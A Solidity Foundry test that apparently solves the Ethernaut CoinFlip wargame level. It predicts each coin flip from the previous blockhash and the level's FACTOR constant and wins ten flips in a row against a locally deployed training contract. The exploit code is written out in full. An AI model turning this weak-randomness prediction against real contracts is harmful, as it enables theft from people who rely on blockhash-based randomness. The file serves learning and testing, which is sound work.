
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {CoinFlip} from "../../src/ethernaut/CoinFlip.sol";

contract CoinFlipTest is Test {
    CoinFlip public coinflip;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // 部署 CoinFlip 合约
    function setUp() public {
        coinflip = new CoinFlip();
    }

    // 攻击函数，计算正确的猜测并调用 flip
    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));


        // 更新哈希值
        lastHash = blockValue;

        // 计算翻转结果
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // 调用 CoinFlip 合约的 flip 函数
        bool result = coinflip.flip(side);
        console.log("Flip result:", result);
        console.log("Consecutive Wins:", coinflip.consecutiveWins());
    }

    // 测试函数，尝试连续猜对十次
    function test_ConsecutiveWins() public {
        console.log("eeeeeeeeeeeeeeeeeeeeeeeeeeee111");
        for (uint256 i = 0; i < 10; i++) {
            // 每次都模拟新的一块，保证 flip 函数正确执行
            vm.roll(block.number + 1);
            attack();
        }

        // 验证是否连续猜对十次
        assertEq(coinflip.consecutiveWins(), 10);
    }
}
